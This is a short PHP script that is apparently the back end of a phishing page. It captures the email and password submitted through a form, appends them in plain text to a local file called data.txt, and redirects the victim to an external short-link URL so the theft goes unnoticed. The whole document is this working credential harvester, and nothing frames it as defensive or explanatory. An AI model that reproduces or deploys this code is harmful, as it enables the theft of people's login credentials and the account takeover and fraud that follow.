<?php
 $path = 'data.txt';
 if (isset($_POST['email']) && isset($_POST['password'])) {
    $fh = fopen($path,"a+");
    $string = $_POST['email'].':'.$_POST['password']. ' | '; 
    fwrite($fh,$string); // Write information to the file
    fclose($fh); // Close the file
    header("Location:https://smrturl.co/o/280521/53298865?s1=");
 }
?>
